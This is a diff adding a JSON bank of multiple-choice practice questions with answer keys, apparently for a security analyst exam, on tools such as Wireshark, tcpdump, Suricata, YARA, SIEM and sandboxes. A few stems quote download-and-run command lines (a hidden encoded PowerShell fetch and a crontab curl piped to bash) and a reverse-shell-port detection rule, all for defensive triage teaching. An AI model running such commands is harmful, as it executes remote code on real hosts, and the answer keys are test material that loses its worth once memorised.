@@ -1,0 +1,2168 @@
+[
+  {
+    "id": "cs4-1-3-mcq-001",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "An analyst finds a long string of letters and digits ending in `=` inside a script. What is CyberChef built to do with it?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Capture the script's network traffic as it executes"
+        },
+        {
+          "id": "b",
+          "text": "Score the sending address against reputation feeds"
+        },
+        {
+          "id": "c",
+          "text": "Apply decode steps in sequence to reveal content"
+        },
+        {
+          "id": "d",
+          "text": "Block the script's callback address at the firewall"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "CyberChef chains operations such as Base64 decoding so an analyst can see what an encoded value contains. It does not capture traffic, rate addresses or enforce blocks; those belong to packet capture, reputation and firewall tools.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-002",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An analyst has a saved capture open in Wireshark and wants to read the full text exchanged in one conversation between two hosts. Which Wireshark feature does this?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Follow TCP Stream"
+        },
+        {
+          "id": "b",
+          "text": "Protocol Hierarchy statistics"
+        },
+        {
+          "id": "c",
+          "text": "Capture filters on the interface"
+        },
+        {
+          "id": "d",
+          "text": "Expert Information messages"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Following a TCP stream reassembles the payload of one conversation into readable text. Protocol Hierarchy only summarizes traffic by protocol, capture filters apply while recording, and Expert Information flags anomalies rather than showing the content.",
+    "acronyms": [
+      "TCP"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-003",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A server has no graphical interface. A responder must record only traffic to and from `198.51.100.23` on port 443 into a file for later analysis. Which command does that?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "`tcpdump -i eth0 -r case.pcap host 198.51.100.23 and port 443`"
+        },
+        {
+          "id": "b",
+          "text": "`tcpdump -i eth0 -D host 198.51.100.23 and port 443`"
+        },
+        {
+          "id": "c",
+          "text": "`tcpdump -i eth0 -w case.pcap not host 198.51.100.23 and port 443`"
+        },
+        {
+          "id": "d",
+          "text": "`tcpdump -i eth0 -w case.pcap host 198.51.100.23 and port 443`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "The `-w` flag writes packets to a file, and the filter limits them to that host and port. `-r` reads an existing file instead of capturing, `-D` only lists interfaces, and `not host` would exclude the very host of interest.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-004",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A team runs Suricata inline in front of a file server. An analyst changes a rule's first keyword from `alert` to `drop`. What changes?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The rule now matches only encrypted sessions"
+        },
+        {
+          "id": "b",
+          "text": "Matching packets are discarded as well as being logged"
+        },
+        {
+          "id": "c",
+          "text": "Matching packets are counted but no longer logged"
+        },
+        {
+          "id": "d",
+          "text": "The rule is applied to outbound traffic only"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "In inline mode the `drop` action discards matching packets and records the event, while `alert` only records it. The keyword does not change which traffic the rule matches or whether it is logged.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-005",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 1,
+    "stem": "A CSIRT wants platforms that store and share structured threat intelligence with partner organizations. Which TWO fit?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "MISP"
+        },
+        {
+          "id": "b",
+          "text": "OpenCTI"
+        },
+        {
+          "id": "c",
+          "text": "tcpdump"
+        },
+        {
+          "id": "d",
+          "text": "Cuckoo Sandbox"
+        },
+        {
+          "id": "e",
+          "text": "strings"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b"
+      ]
+    },
+    "explanation": "MISP and OpenCTI are threat-intelligence platforms that hold indicators and their relationships and can exchange them. tcpdump captures packets, Cuckoo Sandbox detonates files and strings extracts text, so none of them stores or shares intelligence.",
+    "acronyms": [
+      "CSIRT",
+      "MISP",
+      "OpenCTI"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-006",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A Snort sensor raises an alert from the rule below for `ws-0412.example.internal`. What does a match mean?\n\n```\nalert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:\"Outbound shell port\"; flow:established,to_server; sid:1000042; rev:2;)\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "An internal host has an established session outward on port 4444"
+        },
+        {
+          "id": "b",
+          "text": "An outside host is scanning internal servers on port 4444"
+        },
+        {
+          "id": "c",
+          "text": "An internal host is listening for sessions on port 4444"
+        },
+        {
+          "id": "d",
+          "text": "The rule was edited but has not been loaded yet"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "The header reads internal source to external destination on port 4444, and `flow:established,to_server` means the session is already up and heading outward. A scan or an inbound listener would reverse the direction. `rev:2` is only the rule revision number and does not show whether the rule is loaded.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-007",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An analyst deploys Zeek on a network tap. What does it mainly produce for the team to search?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A full copy of every packet payload in a ring buffer"
+        },
+        {
+          "id": "b",
+          "text": "Signature alerts with no connection metadata"
+        },
+        {
+          "id": "c",
+          "text": "A list of missing patches for each host it sees"
+        },
+        {
+          "id": "d",
+          "text": "Structured per-protocol logs, such as `conn.log`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Zeek turns observed traffic into compact, protocol-aware logs that are easy to filter and correlate. It is not a full-packet recorder, it records connection metadata beyond alerts, and it does not assess patch levels.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-008",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which SIEM capability lets an analyst see that one account failed to sign in on many hosts within a few minutes?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Encrypting each log file at rest on every source"
+        },
+        {
+          "id": "b",
+          "text": "Correlating events from many sources by time and field"
+        },
+        {
+          "id": "c",
+          "text": "Scanning each host for missing operating system patches"
+        },
+        {
+          "id": "d",
+          "text": "Replaying packets into an isolated sandbox"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "A SIEM collects logs from many systems and correlates them, which exposes patterns that no single host log shows. Encryption of logs, patch scanning and packet replay are different functions.",
+    "acronyms": [
+      "SIEM"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-009",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "A SIEM rule fires on the lines below. What should the analyst conclude first?\n\n```\n10:02:11 user=jdoe src=203.0.113.50 action=failure\n10:02:13 user=jdoe src=203.0.113.50 action=failure\n10:02:14 user=jdoe src=203.0.113.50 action=failure\n10:02:16 user=jdoe src=203.0.113.50 action=failure\n10:02:18 user=jdoe src=203.0.113.50 action=success\n10:04:40 user=jdoe src=10.20.4.12 action=success\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A password spray, since several accounts were tried"
+        },
+        {
+          "id": "b",
+          "text": "Normal behavior, since the later logon came from an internal address"
+        },
+        {
+          "id": "c",
+          "text": "Guessing that worked from an outside address; confirm with the user"
+        },
+        {
+          "id": "d",
+          "text": "A lockout test by the service desk, ending in one retry"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "Four quick failures and then a success from one outside address against one account point to guessing that worked, so the analyst confirms with the user and resets the credentials. Spraying would show many accounts, the internal logon does not clear the earlier one, and a service desk test would be documented.",
+    "acronyms": [
+      "SIEM"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-010",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 3,
+    "stem": "Which THREE parts of this command line deserve scrutiny during triage?\n\n```\npowershell.exe -w hidden -enc <string> ; IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.5/p\")\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The hidden window style"
+        },
+        {
+          "id": "b",
+          "text": "The encoded command switch"
+        },
+        {
+          "id": "c",
+          "text": "The download-and-run expression"
+        },
+        {
+          "id": "d",
+          "text": "The spacing between the switches and arguments"
+        },
+        {
+          "id": "e",
+          "text": "The name of the executable itself"
+        },
+        {
+          "id": "f",
+          "text": "The use of a quoted string"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b",
+        "c"
+      ]
+    },
+    "explanation": "A hidden window, an encoded payload and downloading then running remote text are all common concealment or staging traits. Spacing between arguments, the executable name and a quoted string are ordinary syntax that appear in legitimate scripts.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-011",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which description fits OTX?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A community platform for sharing indicator collections"
+        },
+        {
+          "id": "b",
+          "text": "A commercial agent that isolates infected endpoints"
+        },
+        {
+          "id": "c",
+          "text": "A packet analyzer for reading saved captures"
+        },
+        {
+          "id": "d",
+          "text": "A scanner that rates settings against a benchmark"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Open Threat Exchange is a community-driven threat-intelligence service in which members publish and subscribe to collections of indicators. The other descriptions fit an endpoint agent, a packet analyzer and a configuration scanner.",
+    "acronyms": [
+      "OTX"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-012",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An EDR console shows `winword.exe` starting `powershell.exe` with an encoded command on a laptop. Which first response contains the host and keeps the evidence?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Reimage the laptop and then start investigating"
+        },
+        {
+          "id": "b",
+          "text": "Delete the document from the shared file server first"
+        },
+        {
+          "id": "c",
+          "text": "Disable the mailbox forwarding rule on the user's account"
+        },
+        {
+          "id": "d",
+          "text": "Isolate the host from the network via the console"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Network isolation from the console stops spread and callbacks while leaving memory and disk intact for analysis. Reimaging destroys evidence, deleting one document does not contain the host, and a mailbox change does not stop the running process.",
+    "acronyms": [
+      "EDR"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-013",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A salesperson reports a tablet lost at an airport; it holds the company mailbox and documents. Which action in the MDM console best limits exposure?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Tighten the USB policy for every tablet in the fleet"
+        },
+        {
+          "id": "b",
+          "text": "Send a remote wipe for the managed corporate data"
+        },
+        {
+          "id": "c",
+          "text": "Raise the screen-lock timeout fleet-wide"
+        },
+        {
+          "id": "d",
+          "text": "Rename the device in the inventory"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "A remote wipe removes the managed data from the lost device, which is the direct exposure. USB and timeout policies do not help a device already in someone else's hands, and renaming changes nothing about access.",
+    "acronyms": [
+      "MDM",
+      "USB"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-014",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "A domain in a phishing link looks brand new. Which lookup shows when it was created and through which registrar?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A reverse DNS check on its hosting web server"
+        },
+        {
+          "id": "b",
+          "text": "A packet capture of the landing page traffic"
+        },
+        {
+          "id": "c",
+          "text": "A registration-record query using `whois`"
+        },
+        {
+          "id": "d",
+          "text": "A hash lookup of the file that the page serves"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "A `whois` query returns registration details such as the creation date, registrar and name servers. Reverse DNS, a capture and a file hash lookup answer different questions.",
+    "acronyms": [
+      "DNS"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-015",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "An analyst checks `203.0.113.77` from firewall logs on AbuseIPDB and sees a high confidence score with many recent reports. How should the result be used?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "As supporting evidence for a block and a deeper log review"
+        },
+        {
+          "id": "b",
+          "text": "As proof that an internal host is infected"
+        },
+        {
+          "id": "c",
+          "text": "As a reason to discount it because reports come from volunteers"
+        },
+        {
+          "id": "d",
+          "text": "As a substitute for reading the firewall logs"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Crowd-sourced reputation is a useful signal that justifies blocking and looking for related activity, but it does not prove an infection or replace the local logs. Dismissing it ignores real evidence.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-016",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Before detonating a suspicious attachment, which TWO actions are safe static analysis steps?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Extract the readable strings from the file"
+        },
+        {
+          "id": "b",
+          "text": "Look up the file hash in a reputation service"
+        },
+        {
+          "id": "c",
+          "text": "Open it on a production workstation with macros enabled"
+        },
+        {
+          "id": "d",
+          "text": "Run it with internet access to see what it contacts"
+        },
+        {
+          "id": "e",
+          "text": "Email it to the user to confirm it is theirs"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b"
+      ]
+    },
+    "explanation": "Strings extraction and a hash lookup never execute the file, so they are safe static steps. Opening, running or forwarding the sample puts real systems and people at risk.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-017",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A user's VPN sign-ins show GeoIP locations in two countries 20 minutes apart. What does this most likely indicate?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A DHCP lease renewal on the laptop that signed in"
+        },
+        {
+          "id": "b",
+          "text": "Two different time zones shown in the SIEM display"
+        },
+        {
+          "id": "c",
+          "text": "A certificate renewal on the gateway"
+        },
+        {
+          "id": "d",
+          "text": "Impossible travel, a sign of credential misuse"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "A person cannot be in two countries within 20 minutes, so the pattern suggests the credentials are being used from a second place. Lease renewals, time zone display and certificate changes do not alter the source location.",
+    "acronyms": [
+      "VPN",
+      "GeoIP",
+      "DHCP",
+      "SIEM"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-018",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A file hash submitted to VirusTotal returns zero detections and a first-seen time of two minutes ago. What is the best reading?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Clean, so the ticket can be closed"
+        },
+        {
+          "id": "b",
+          "text": "Malicious, because a new file is suspicious by itself"
+        },
+        {
+          "id": "c",
+          "text": "Unknown, not clean; analyze the sample further"
+        },
+        {
+          "id": "d",
+          "text": "Corrupted, because the hash did not match"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "A file that no engine has seen has no verdict yet, and a lack of detections is not proof of safety. Closing the ticket is premature, newness alone does not make a file malicious, and a hash lookup does not test file integrity.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-019",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "Which file would this YARA rule match?\n\n```\nrule Invoice_Loader {\n  strings:\n    $a = \"cmd.exe /c\" ascii\n    $b = { 4D 5A 90 00 }\n    $c = \"invoice_\" ascii\n  condition:\n    $b at 0 and ($a or $c)\n}\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A text file that contains both strings but has other first bytes"
+        },
+        {
+          "id": "b",
+          "text": "A file that starts with `4D 5A 90 00` and contains `invoice_`"
+        },
+        {
+          "id": "c",
+          "text": "A file that starts with `4D 5A 90 00` and contains neither string"
+        },
+        {
+          "id": "d",
+          "text": "Any file that contains `cmd.exe /c`, whatever its first bytes"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "The condition requires the header bytes at offset zero and at least one of the two strings, so the second option qualifies. Without the header the other conditions cannot be met, and a file with no string fails the second half.",
+    "acronyms": [
+      "YARA"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-020",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "Joe Sandbox returns a report for a sample with no network calls after 60 seconds, but the sample contains a long sleep routine. What is the likely issue?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "The sandbox blocked the sample by policy"
+        },
+        {
+          "id": "b",
+          "text": "The sleep routine proves the sample is a benign document"
+        },
+        {
+          "id": "c",
+          "text": "The report is complete, because no calls means no malicious behavior"
+        },
+        {
+          "id": "d",
+          "text": "The sample delays running to evade analysis, so extend the run time"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "Malware often waits out short sandbox runs, so an empty report after a delay says little. Extending the time or accelerating the clock exposes the later behavior. A policy block would be reported, sleeps do not prove innocence, and the report cannot be called complete.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-021",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Cuckoo Sandbox is open source. What does it do with a submitted file?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Runs it in a guest VM and logs its behavior"
+        },
+        {
+          "id": "b",
+          "text": "Compares its hash against a list of known signatures"
+        },
+        {
+          "id": "c",
+          "text": "Prints the readable text found inside the file"
+        },
+        {
+          "id": "d",
+          "text": "Looks up the registration record of the publisher"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Cuckoo detonates the sample in an isolated guest and reports what it does. A hash list lookup, a strings dump and a registration query are not behavioral analysis.",
+    "acronyms": [
+      "VM"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-022",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 3,
+    "stem": "An XDR platform links a phishing message to a later suspicious sign-in. Which TWO data sources let it make that link beyond endpoint telemetry?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "Email gateway logs showing the message delivery"
+        },
+        {
+          "id": "b",
+          "text": "Identity provider logs showing the later sign-in"
+        },
+        {
+          "id": "c",
+          "text": "The printer firmware version list kept by facilities"
+        },
+        {
+          "id": "d",
+          "text": "The nightly backup job schedule for file servers"
+        },
+        {
+          "id": "e",
+          "text": "The badge reader list for the lobby entrance doors"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b"
+      ]
+    },
+    "explanation": "Extended detection and response joins several telemetry layers, and the message delivery and the sign-in are the two events that connect the chain. Printer firmware, backup schedules and lobby badge data do not describe either event.",
+    "acronyms": [
+      "XDR"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-023",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Which regular expression matches an address written as four groups of one to three digits separated by literal dots, such as `10.20.4.12`?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "`\\b\\d{1,3}(?:.\\d{1,3}){3}\\b`"
+        },
+        {
+          "id": "b",
+          "text": "`^\\d{1,3}(\\.\\d{1,3}){4}$`"
+        },
+        {
+          "id": "c",
+          "text": "`\\b\\d{1,3}(\\.\\d{1,3}){3}\\b`"
+        },
+        {
+          "id": "d",
+          "text": "`\\b\\w{1,3}(\\.\\w{1,3}){3}$`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "The escaped dot matches a literal dot, and three repeats after the first group make four groups in total. An unescaped dot matches any character, four repeats would need five groups, and `\\w` also accepts letters.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-024",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 3,
+    "stem": "An EDR alert shows the command line below, started by a spreadsheet. What does it most strongly indicate?\n\n```\npowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...\n```",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A routine software update pushed by the IT team overnight"
+        },
+        {
+          "id": "b",
+          "text": "Hidden execution of an encoded script that still needs decoding"
+        },
+        {
+          "id": "c",
+          "text": "A user reading help text in a visible console window"
+        },
+        {
+          "id": "d",
+          "text": "A scheduled disk cleanup job run by the system"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "Encoded commands, a hidden window and skipped profile loading are common ways to hide script content from a user and from simple logging. A spreadsheet launching it adds to the suspicion; updates, help text and cleanup jobs would not look like this.",
+    "acronyms": [
+      "EDR",
+      "IT"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-025",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A crontab entry on a web host reads `*/5 * * * * curl -s http://198.51.100.9/x.sh | bash`. What is the main concern?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "It fetches a remote script and runs it unreviewed"
+        },
+        {
+          "id": "b",
+          "text": "It uploads the local shell history to a server"
+        },
+        {
+          "id": "c",
+          "text": "It checks whether the address responds and then exits"
+        },
+        {
+          "id": "d",
+          "text": "It rotates the local logs every five minutes"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "Piping a downloaded script straight into the shell executes whatever the remote server serves, and the schedule repeats it. Nothing in the line uploads data, merely tests reachability, or rotates logs.",
+    "acronyms": []
+  },
+  {
+    "id": "cs4-1-3-mcq-026",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "A message claims to come from the finance director but fails SPF. Which MXToolbox lookup shows what the sending domain tells receivers to do when SPF and DKIM checks fail?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A blocklist check on the website"
+        },
+        {
+          "id": "b",
+          "text": "A port scan of the mail server"
+        },
+        {
+          "id": "c",
+          "text": "A certificate expiry check"
+        },
+        {
+          "id": "d",
+          "text": "A DMARC record lookup"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "d"
+      ]
+    },
+    "explanation": "The DMARC record publishes the domain's policy for failing authentication, such as none, quarantine or reject. Blocklists, port scans and certificate checks do not reveal that policy.",
+    "acronyms": [
+      "SPF",
+      "DKIM",
+      "DMARC"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-027",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "A UEBA platform alerts that an engineer downloaded 40 times more data than their 90-day norm at 03:00. Which technique produced the alert?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A signature match on a known malicious hash"
+        },
+        {
+          "id": "b",
+          "text": "A comparison with a learned baseline"
+        },
+        {
+          "id": "c",
+          "text": "A static allow list of approved hosts"
+        },
+        {
+          "id": "d",
+          "text": "A vulnerability scan comparison"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "b"
+      ]
+    },
+    "explanation": "User and entity behavior analytics learns what is normal for each account and flags large deviations. Hash signatures, allow lists and vulnerability scans are not based on behavioral baselines.",
+    "acronyms": [
+      "UEBA"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-028",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-multi",
+    "difficulty": 2,
+    "stem": "Which TWO statements about structured log and rule formats are accurate?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "JSON stores key-value pairs that tools can query by field"
+        },
+        {
+          "id": "b",
+          "text": "YAML uses indentation for structure and suits rule files"
+        },
+        {
+          "id": "c",
+          "text": "XML cannot hold elements nested within other elements"
+        },
+        {
+          "id": "d",
+          "text": "EVTX files are plain text that `grep` reads directly"
+        },
+        {
+          "id": "e",
+          "text": "JSON needs the same number of fields on every line"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a",
+        "b"
+      ]
+    },
+    "explanation": "JSON key-value pairs allow field queries, and YAML relies on indentation. XML nests elements by design, EVTX is a binary format, and JSON objects may have different fields.",
+    "acronyms": [
+      "JSON",
+      "YAML",
+      "XML",
+      "EVTX"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-029",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 2,
+    "stem": "Which statement describes OpenUBA?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "A scanner that checks hosts for known weaknesses"
+        },
+        {
+          "id": "b",
+          "text": "A hosted sandbox for detonating suspicious files"
+        },
+        {
+          "id": "c",
+          "text": "An open-source behavior analytics framework for log data"
+        },
+        {
+          "id": "d",
+          "text": "A registry of domain ownership and contact records"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "c"
+      ]
+    },
+    "explanation": "OpenUBA is an open-source project for user behavior analytics on collected logs. A vulnerability scanner, a hosted sandbox and a registration registry have different purposes.",
+    "acronyms": [
+      "OpenUBA"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-030",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
+      "1.3"
+    ],
+    "status": "approved",
+    "type": "mcq-single",
+    "difficulty": 1,
+    "stem": "Which Python call turns the JSON text held in a string variable `raw` into a dictionary?",
+    "payload": {
+      "options": [
+        {
+          "id": "a",
+          "text": "`json.loads(raw)`"
+        },
+        {
+          "id": "b",
+          "text": "`json.dumps(raw)`"
+        },
+        {
+          "id": "c",
+          "text": "`json.load(raw)`"
+        },
+        {
+          "id": "d",
+          "text": "`json.decode(raw)`"
+        }
+      ]
+    },
+    "answer": {
+      "correct": [
+        "a"
+      ]
+    },
+    "explanation": "`json.loads` parses a string. `json.dumps` goes the other way, `json.load` expects an open file object, and the module has no `json.decode` function.",
+    "acronyms": [
+      "JSON"
+    ]
+  },
+  {
+    "id": "cs4-1-3-mcq-031",
+    "exam": "CS0-004",
+    "source": "ours",
+    "objectiveIds": [
